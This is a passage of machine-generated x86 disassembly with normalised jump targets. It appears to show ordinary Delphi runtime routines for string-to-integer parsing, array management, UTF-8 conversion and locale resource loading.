call sub_44aa5c
pop eax
jmp r-xdata
cmp cl 0xe
je r-xdata
xor ecx ecx
mov cl [ edx + 0x1 ]
mov ecx [ ecx + edx + 0x2 ]
push ecx
mov ecx edx
lea edx [ eax + esi ]
add eax ebx
call sub_44a91c
pop eax
jmp r-xdata
cmp cl 0xf
je r-xdata
mov edx [ eax + esi ]
add eax ebx
call sub_44b8f0
mov eax 0x4
jmp r-xdata
cmp cl 0x11
je r-xdata
mov ecx edx
mov edx [ eax + esi ]
add eax ebx
call sub_44b138
mov eax 0x4
mov al 0x2
pop ebp
pop edi
pop esi
pop ebx
jmp sub_447670
sub_44aa5c
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
mov edi ecx
mov ebp [ esp + 0x14 ]
mov cl [ edi ]
cmp cl 0xa
je r-xdata
mov eax ebx
mov edx [ esi ]
call sub_44939c
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0xb
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
call sub_449a14
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0x12
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn 0x4
jmp r-xdata
mov eax ebx
mov edx [ esi ]
call sub_449d2c
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0xc
je r-xdata
jmp r-xdata
mov eax ebx
mov edx esi
call sub_44a904
add ebx 0x10
add esi 0x10
dec ebp
jne r-xdata
cmp cl 0xd
je r-xdata
jmp r-xdata
xor ecx ecx
mov cl [ edi + 0x1 ]
lea edi [ ecx + edi + 0x2 ]
cmp cl 0xe
je r-xdata
mov eax ebx
mov edx esi
mov ecx [ edi + 0x8 ]
mov ecx [ ecx ]
push [ edi + 0x4 ]
call sub_44aa5c
add ebx [ edi ]
add esi [ edi ]
dec ebp
jne r-xdata
jmp r-xdata
mov eax ebx
mov edx esi
mov ecx edi
call sub_44a91c
xor eax eax
mov al [ edi + 0x1 ]
add ebx [ eax + edi + 0x2 ]
add esi [ eax + edi + 0x2 ]
dec ebp
jne r-xdata
cmp cl 0xf
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
call sub_44b8f0
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0x11
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
mov ecx edi
call sub_44b138
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
mov al 0x2
pop ebp
pop edi
pop esi
pop ebx
jmp sub_447670
sub_44ab8c
push edx
push eax
mov eax [ esp + 0x10 ]
mul [ esp ]
mov ecx eax
mov eax [ esp + 0x4 ]
mul [ esp + 0xc ]
add ecx eax
mov eax [ esp ]
mul [ esp + 0xc ]
add edx ecx
pop ecx
pop ecx
retn 0x8
sub_44abb0
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call j_sub_449880
xor eax eax
push ebp
push sub_44af12
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi 0x1
xor esi esi
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0xc ] 0x0
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
call sub_4494ec
cmp [ eax + edi * 2 - 0x2 ] 0x20
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] edi
jmp r-xdata
inc edi
mov [ ebp - 0x11 ] 0x0
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44af19
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
cmp [ eax + edi * 2 - 0x2 ] 0x2d
jne r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov [ ebp - 0x11 ] 0x1
inc edi
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
cmp [ eax + edi * 2 - 0x2 ] 0x2b
jne r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
mov bl 0x1
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
inc edi
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
cmp [ eax + edi * 2 - 0x2 ] 0x24
jne r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov al 0x1
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
movzx edx [ eax + edi * 2 - 0x2 ]
movzx ecx [ eax + edi * 2 - 0x2 ]
add ecx 0xffffff9f
sub cx 0x1a
jae r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
test al al
je r-xdata
cmp dx 0x58
sete al
movzx edx [ eax + edi * 2 - 0x2 ]
and dx 0xffdf
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov al 0x1
jmp r-xdata
cmp [ eax + edi * 2 - 0x2 ] 0x30
jne r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
test al al
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
mov eax [ ebp - 0x4 ]
movzx eax [ eax + edi * 2 - 0x2 ]
add eax 0xffffffd0
sub ax 0xa
jae r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
movzx edx [ eax + edi * 2 ]
movzx ecx [ eax + edi * 2 ]
add ecx 0xffffff9f
sub cx 0x1a
jae r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
cmp [ ebp - 0x11 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
movzx esi [ eax + edi * 2 - 0x2 ]
sub esi 0x30
cmp [ ebp - 0xc ] 0x0
jne r-xdata
cmp [ eax + edi * 2 - 0x2 ] 0x30
jne r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
cmp dx 0x58
sete al
jmp r-xdata
movzx edx [ eax + edi * 2 ]
and dx 0xffdf
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
neg eax
adc edx 0x0
neg edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jl r-xdata
cmp [ ebp - 0x10 ] 0x0
jb r-xdata
inc edi
inc edi
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
je r-xdata
cmp [ ebp - 0x10 ] 0x0
cmp [ ebp - 0xc ] 0xccccccc
jne r-xdata
jmp r-xdata
movzx esi cx
sub esi 0x30
jmp r-xdata
add eax 0xfffffff9
sub ax 0x6
jb r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
jg r-xdata
cmp [ ebp - 0x10 ] 0xcccccccc
jbe r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
movzx esi cx
sub esi 0x37
jmp r-xdata
add eax 0xffffffe6
sub ax 0x6
jb r-xdata
cmp [ eax + edi * 2 - 0x2 ] 0x0
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
setl al
cmp [ ebp - 0x10 ] 0x0
setb al
jmp r-xdata
push 0x0
push 0xa
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
call sub_44ab8c
push edx
push eax
mov eax esi
cdq
add eax [ esp ]
adc edx [ esp + 0x4 ]
add esp 0x8
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
inc edi
xor ebx ebx
jmp r-xdata
jmp r-xdata
jl r-xdata
cmp [ ebp - 0x10 ] 0x0
jb r-xdata
movzx esi cx
sub esi 0x57
jmp r-xdata
mov eax ebx
mov al 0x1
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
dec edi
cmp al [ ebp - 0x11 ]
je r-xdata
cmp [ ebp - 0x11 ] 0x0
je r-xdata
cmp [ ebp - 0xc ] 0xfffffff
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax ] edx
mov eax [ ebp - 0x8 ]
mov [ eax ] edi
jmp r-xdata
test al al
je r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
neg eax
adc edx 0x0
neg edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
jg r-xdata
cmp [ ebp - 0x10 ] 0xffffffff
jbe r-xdata
mov eax esi
cdq
push edx
push eax
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
shld edx eax 0x4
shl eax 0x4
add eax [ esp ]
adc edx [ esp + 0x4 ]
add esp 0x8
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
inc edi
xor ebx ebx
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx ecx [ eax + edi * 2 - 0x2 ]
mov eax ecx
add eax 0xffffffd0
sub ax 0xa
jb r-xdata
sub_44af58
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp - 0x4 ]
mov ebx [ ebx ]
mov eax [ ebp + 0x8 ]
mov edi [ eax ]
test edi edi
jg r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
test ebx ebx
je r-xdata
test edi edi
jge r-xdata
movzx eax [ esi + 0x1 ]
add esi eax
mov eax esi
mov edx [ eax + 0x2 ]
mov [ ebp - 0x18 ] edx
mov edx [ eax + 0x6 ]
test edx edx
je r-xdata
sub ebx 0x4
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
sub ebx 0x4
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_44af50
jmp r-xdata
mov al 0x4
call sub_447670
xor esi esi
mov esi [ edx ]
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebp - 0x1c ] 0x8
cmp [ ebp - 0x1c ] 0x0
jge r-xdata
mov al 0x4
call sub_447670
mov eax edi
imul [ ebp - 0x18 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x1c ]
cdq
idiv edi
cmp eax [ ebp - 0x18 ]
je r-xdata
test ebx ebx
je r-xdata
mov al 0x4
call sub_447670
mov [ ebp - 0x20 ] ebx
cmp edi [ ebp - 0x10 ]
jge r-xdata
cmp [ ebx ] 0x1
jne r-xdata
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0x1c ]
call sub_4474c0
mov ebx [ ebp - 0x20 ]
jmp r-xdata
test esi esi
je r-xdata
dec [ ebx ]
mov eax [ ebp - 0x1c ]
call sub_44748c
mov ebx eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
cmp edi [ ebp - 0x14 ]
jge r-xdata
mov [ ebx ] 0x1
add ebx 0x4
mov [ ebx ] edi
add ebx 0x4
mov edx edi
sub edx [ ebp - 0x10 ]
imul edx [ ebp - 0x18 ]
mov eax [ ebp - 0x18 ]
imul eax [ ebp - 0x10 ]
add eax ebx
xor ecx ecx
call sub_447ae4
cmp [ ebp - 0x8 ] 0x1
jle r-xdata
mov eax ebx
add eax 0x8
mov edx edi
imul edx [ ebp - 0x18 ]
add eax edx
mov ecx [ ebp - 0x10 ]
sub ecx edi
mov edx esi
call j_sub_44a7e8
test esi esi
je r-xdata
mov [ ebp - 0x14 ] edi
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
add [ ebp + 0x8 ] 0x4
dec [ ebp - 0x8 ]
dec edi
test edi edi
jl r-xdata
mov ecx [ ebp - 0x14 ]
imul ecx [ ebp - 0x18 ]
mov edx ebx
add edx 0x8
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_4476cc
mov edx [ ebp - 0x14 ]
imul edx [ ebp - 0x18 ]
mov eax ebx
add eax 0x8
xor ecx ecx
call sub_447ae4
mov eax [ ebp - 0x14 ]
push eax
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov eax ebx
add eax 0x8
mov ecx esi
call sub_44af38
jmp r-xdata
inc edi
mov [ ebp - 0xc ] 0x0
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0xc ]
lea eax [ ebx + eax * 4 ]
mov ecx [ ebp - 0x8 ]
mov edx esi
call sub_44af58
inc [ ebp - 0xc ]
dec edi
jne r-xdata
sub_44b0fc
mov ecx [ eax ]
test ecx ecx
je r-xdata
retn
mov [ eax ] 0x0
[ ecx - 0x8 ]
jne r-xdata
push eax
mov eax ecx
xor ecx ecx
mov cl [ edx + 0x1 ]
mov edx [ ecx + edx + 0x6 ]
test edx edx
je r-xdata
sub eax 0x8
call sub_4474a8
pop eax
mov ecx [ eax - 0x4 ]
test ecx ecx
je r-xdata
mov edx [ edx ]
call sub_44a7e8
sub_44b138
push ebx
mov ebx [ eax ]
test edx edx
je r-xdata
test ebx ebx
je r-xdata
[ edx - 0x8 ]
mov [ eax ] edx
pop ebx
retn
[ ebx - 0x8 ]
jne r-xdata
push eax
push edx
mov edx ecx
inc [ ebx - 0x8 ]
call sub_44b0fc
pop edx
pop eax
sub_44b16c
add esp 0xffffffe4
push 0x1c
lea edx [ esp + 0x4 ]
push edx
push eax
call VirtualQuery
cmp [ esp + 0x10 ] 0x1000
jne r-xdata
xor eax eax
mov eax [ esp + 0x4 ]
jmp r-xdata
add esp 0x1c
retn
sub_44b19c
push ebx
push esi
add esp 0xfffffdf4
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov eax [ ebx + 0x10 ]
add esp 0x20c
pop esi
pop ebx
retn
push 0x20a
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call GetModuleFileNameW
mov eax esp
mov dl 0x1
call sub_44b43c
mov esi eax
mov [ ebx + 0x10 ] esi
test esi esi
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ ebx + 0x10 ] eax
sub_44b1e4
push ebx
push esi
push edi
mov esi eax
mov ebx [ rw-data ]
test ebx ebx
je r-xdata
mov edi esi
cmp esi [ ebx + 0x4 ]
je r-xdata
mov eax ebx
call sub_44b19c
mov edi eax
jmp r-xdata
cmp esi [ ebx + 0x8 ]
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
cmp esi [ ebx + 0xc ]
jne r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
sub_44b21c
push ebx
push esi
mov ebx eax
jmp r-xdata
movzx esi [ ebx ]
test si si
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
cmp si 0x5c
jne r-xdata
push ebx
call CharNextW
mov ebx eax
sub_44b240
push ebp
mov ebp esp
add esp 0xfffffb94
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
push r-xdata
call GetModuleHandleW
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x5c
jne r-xdata
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
call GetProcAddress
mov ebx eax
test ebx ebx
je r-xdata
mov esi [ ebp - 0x4 ]
add esi 0x4
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2 ] 0x5c
jne r-xdata
push 0x105
lea eax [ ebp - 0x46a ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call ebx
test eax eax
je r-xdata
lea eax [ ebx + 0x1 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x46a ]
push eax
call lstrcpynW
jmp r-xdata
adc ebx 0x0
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
add eax 0x4
call sub_44b21c
mov esi eax
cmp [ esi ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x46a ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call lstrcpynW
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
lea eax [ esi + 0x2 ]
call sub_44b21c
mov esi eax
cmp [ esi ] 0x0
je r-xdata
lea eax [ esi + 0x2 ]
call sub_44b21c
mov edi eax
mov eax edi
sub eax esi
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x46a ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call lstrcpynW
jmp r-xdata
add eax ebx
inc eax
cmp eax 0x105
jg r-xdata
adc eax 0x0
mov ebx esi
sub ebx [ ebp - 0x4 ]
sar ebx 0x1
jns r-xdata
mov eax edi
sub eax esi
sar eax 0x1
jns r-xdata
inc eax
push eax
push esi
lea eax [ ebp - 0x46a ]
mov edx ebx
add edx edx
add eax edx
push eax
call lstrcpynW
lea eax [ ebp - 0x260 ]
push eax
lea eax [ ebp - 0x46a ]
push eax
call FindFirstFileW
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0xffffffff
je r-xdata
adc eax 0x0
mov eax [ ebp - 0x10 ]
push eax
call FindClose
lea eax [ ebp - 0x234 ]
push eax
call lstrlenW
lea edx [ ebx + 0x1 ]
add eax edx
inc eax
cmp eax 0x105
jg r-xdata
mov [ ebp + ebx * 2 - 0x46a ] 0x5c
mov eax 0x105
sub eax ebx
dec eax
push eax
lea eax [ ebp - 0x234 ]
push eax
lea eax [ ebp - 0x46a ]
mov edx ebx
add edx edx
add eax edx
add eax 0x2
push eax
call lstrcpynW
lea eax [ ebp - 0x234 ]
push eax
call lstrlenW
inc eax
add ebx eax
mov esi edi
sub_44b43c
push ebp
mov ebp esp
add esp 0xfffffdd4
push ebx
push esi
mov [ ebp - 0x4 ] eax
push 0x105
lea eax [ ebp - 0x22a ]
push eax
push 0x0
call GetModuleFileNameW
mov [ ebp - 0x1c ] 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000001
call RegOpenKeyExW
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_44b570
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x20 ] 0xa
lea eax [ ebp - 0x22a ]
mov edx 0x105
call sub_44b240
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x22a ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call RegQueryValueExW
test eax eax
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000002
call RegOpenKeyExW
test eax eax
je r-xdata
mov eax [ ebp - 0x20 ]
sar eax 0x1
jns r-xdata
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call RegQueryValueExW
test eax eax
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000001
call RegOpenKeyExW
test eax eax
je r-xdata
mov [ ebp + eax * 2 - 0x1c ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call RegCloseKey
retn
adc eax 0x0
mov [ ebp - 0x1c ] 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000001
call RegOpenKeyExW
test eax eax
jne r-xdata
push 0x105
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x22a ]
push eax
call lstrcpynW
push 0x5
lea eax [ ebp - 0x12 ]
push eax
push 0x3
call GetThreadLocale
push eax
call GetLocaleInfoW
xor esi esi
cmp [ ebp - 0x22a ] 0x0
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x12 ] 0x0
jne r-xdata
lea eax [ ebp - 0x22a ]
push eax
call lstrlenW
mov ebx eax
add ebx ebx
lea eax [ ebp - 0x22a ]
add ebx eax
jmp r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
cmp [ ebx ] 0x2e
je r-xdata
lea eax [ ebp - 0x22a ]
cmp ebx eax
je r-xdata
lea eax [ ebp - 0x22a ]
cmp ebx eax
jne r-xdata
add ebx 0x2
cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub ebx 0x2
test esi esi
jne r-xdata
mov edx ebx
sub edx eax
sar edx 0x1
jns r-xdata
cmp [ ebp - 0x12 ] 0x0
je r-xdata
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0x1c ]
push eax
push ebx
call lstrcpynW
push 0x2
push 0x0
lea eax [ ebp - 0x22a ]
push eax
call LoadLibraryExW
mov esi eax
adc edx 0x0
lea eax [ ebp - 0x22a ]
mov edx ebx
sub edx eax
sar edx 0x1
jns r-xdata
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0x12 ]
push eax
push ebx
call lstrcpynW
push 0x2
push 0x0
lea eax [ ebp - 0x22a ]
push eax
call LoadLibraryExW
mov esi eax
test esi esi
jne r-xdata
adc edx 0x0
mov [ ebp - 0xe ] 0x0
lea eax [ ebp - 0x22a ]
mov edx ebx
sub edx eax
sar edx 0x1
jns r-xdata
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0x12 ]
push eax
push ebx
call lstrcpynW
push 0x2
push 0x0
lea eax [ ebp - 0x22a ]
push eax
call LoadLibraryExW
mov esi eax
adc edx 0x0
sub_44b798
push ebx
push esi
push edi
push ebp
mov ebp eax
mov edi [ rw-data ]
test edi edi
je r-xdata
mov ebx edi
test ebx ebx
je r-xdata
mov eax [ edi + 0x4 ]
cmp eax ebp
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov esi [ ebx ]
test esi esi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ rw-data ] eax
mov edx 0x8
mov eax edi
call sub_4474a8
jmp r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
mov eax [ esi + 0x4 ]
cmp eax ebp
jne r-xdata
mov edi esi
mov eax [ esi ]
mov [ ebx ] eax
mov edx 0x8
mov eax edi
call sub_4474a8
jmp r-xdata
sub_44b7fc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
xor eax eax
push ebp
push sub_44b837
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebx + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
sub_44b868
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_44b8cc
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_44b7fc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44b8d3
mov eax [ ebp - 0x4 ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov [ rw-data ] eax
jmp r-xdata
retn
mov edx [ eax ]
cmp edx [ ebp - 0x4 ]
jne r-xdata
mov eax [ eax ]
test eax eax
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov [ eax ] edx
jmp r-xdata
sub_44b8f0
test edx edx
je r-xdata
mov ecx [ eax ]
test ecx ecx
mov [ eax ] edx
je r-xdata
push edx
push eax
mov eax [ edx ]
push edx
call [ eax + 0x4 ]
pop eax
mov ecx [ eax ]
pop [ eax ]
test ecx ecx
jne r-xdata
retn
mov eax [ ecx ]
push ecx
call [ eax + 0x8 ]
mov eax [ ecx ]
push ecx
call [ eax + 0x8 ]
retn
retn
sub_44b91c
test edx edx
je sub_44b8d8
push edi
mov edi eax
push 0x0
push esp
push ecx
push edx
mov eax [ edx ]
call [ eax ]
test eax eax
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
mov al 0x17
jmp sub_447670
pop eax
mov [ edi ] eax
pop edi
retn
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
sub_44b9c0
push ebp
mov ebp esp
push ebx
push esi
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x4 ]
call sub_445854
mov esi eax
test esi esi
jne r-xdata
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x4 ]
sub_44b9e8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
xor eax eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
test ebx ebx
je r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp + 0x8 ]
push eax
push esi
push 0x0
push 0xfde9
call WideCharToMultiByte
push 0x0
push 0x0
push edi
push ebx
mov eax [ ebp + 0x8 ]
push eax
push esi
push 0x0
push 0xfde9
call WideCharToMultiByte
test eax eax
jbe r-xdata
cmp edi eax
jb r-xdata
cmp [ ebx + eax - 0x1 ] 0x0
je r-xdata
cmp edi eax
jne r-xdata
inc eax
jmp r-xdata
cmp eax 0x1
jbe r-xdata
mov [ ebx + eax - 0x1 ] 0x0
jmp r-xdata
cmp [ ebx + eax - 0x1 ] 0x7f
jbe r-xdata
test [ ebx + eax - 0x1 ] 0x80
je r-xdata
movzx edx [ ebx + eax - 0x1 ]
and dl 0xc0
cmp dl 0xc0
jne r-xdata
dec eax
jmp r-xdata
sub_44ba78
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
test ebx ebx
je r-xdata
push 0x0
push 0x0
mov eax [ ebp + 0x8 ]
push eax
push edi
push 0x0
push 0xfde9
call MultiByteToWideChar
test esi esi
jbe r-xdata
push esi
push ebx
mov eax [ ebp + 0x8 ]
push eax
push edi
push 0x0
push 0xfde9
call MultiByteToWideChar
test eax eax
jbe r-xdata
cmp esi eax
jb r-xdata
cmp [ ebx + eax * 2 - 0x2 ] 0x0
je r-xdata
cmp esi eax
jne r-xdata
inc eax
cmp eax 0x1
jbe r-xdata
mov [ ebx + eax * 2 - 0x2 ] 0x0
jmp r-xdata
cmp [ ebx + eax * 2 - 0x2 ] 0xdc00
jb r-xdata
cmp [ ebx + eax * 2 - 0x2 ] 0xdfff
ja r-xdata
dec eax
jmp r-xdata
sub_44bafc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call j_sub_449880
xor eax eax
push ebp
push sub_44bc0c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_449348
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44bc13
lea eax [ ebp - 0x8 ]
call sub_449348
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
mov ebx eax
lea edx [ ebx + ebx * 2 ]
lea eax [ ebp - 0x8 ]
mov ecx 0xfde9
call sub_449910
mov eax [ ebp - 0x8 ]
test eax eax
je r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
mov edi eax
test edi edi
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x1
je r-xdata
push ebx
mov eax [ ebp - 0x4 ]
call sub_449db8
push eax
mov eax [ ebp - 0x8 ]
call sub_449890
lea edx [ edi + 0x1 ]
pop ecx
call sub_44b9e8
mov ebx eax
test ebx ebx
jle r-xdata
sub edi 0x4
mov edi [ edi ]
lea eax [ ebp - 0x8 ]
mov cx 0xfde9
mov edx [ ebp - 0x8 ]
call sub_44950c
lea eax [ ebp - 0x8 ]
call sub_449348
mov edx ebx
dec edx
lea eax [ ebp - 0x8 ]
mov ecx 0xfde9
call sub_449910
jmp r-xdata
mov eax [ esi ]
sub eax 0xc
mov [ eax ] 0xfde9
mov eax esi
mov edx [ ebp - 0x8 ]
call sub_44939c
cmp [ esi ] 0x0
je r-xdata
sub_44bc1c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call j_sub_449880
xor eax eax
